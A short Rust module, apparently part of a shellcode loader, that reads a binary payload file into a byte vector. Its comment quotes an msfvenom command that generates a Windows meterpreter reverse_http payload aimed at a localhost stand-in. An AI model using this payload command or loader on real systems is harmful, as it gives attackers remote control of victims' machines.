// Module that gets the content of a shellcode file, and returns its content in a Vec<u8>.
use std::path::Path;
use std::path::{PathBuf};


fn shellcode_reader_from_file(path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let bytes = std::fs::read(path)?;
    //println!("{:#04X?}", &bytes);
    Ok(bytes)
}

pub fn meta_shellcode_reader(file_path: &PathBuf) -> Vec<u8> {
    println!("[+] Reading binary file..");
    let path_to_shellcode_file = Path::new(&file_path);
    let shellcode = shellcode_reader_from_file(path_to_shellcode_file);

    match shellcode {
        Ok(bytes) => {
            println!("[+] Done reading binary file!");
            // shellcode used for tests msfvenom -p windows/x64/meterpreter_reverse_http LHOST=127.0.0.1 EXITFUNC=thread LPORT=80 -f raw -o shellcode.bin
            return bytes;
        }
        Err(err) => panic!("{:?}", err),
    }
}